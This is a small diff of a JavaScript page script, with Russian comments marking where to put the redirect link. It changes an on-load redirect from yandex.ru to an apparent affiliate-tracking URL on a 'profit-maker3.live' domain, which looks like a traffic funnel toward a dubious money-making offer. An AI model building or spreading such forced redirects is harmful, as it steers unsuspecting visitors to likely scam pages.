@@ -37,7 +37,7 @@ window.onload = function () {
         //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
         //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
 
-            location.href = 'http://www.yandex.ru/';
+            location.href = 'https://profit-maker3.live/XXgrqF?sub1=Webmaster&sub2=AdAccount&sub3=Note&sub4=Pixel&sub5=UrlForPixel';
 
         //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
         //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
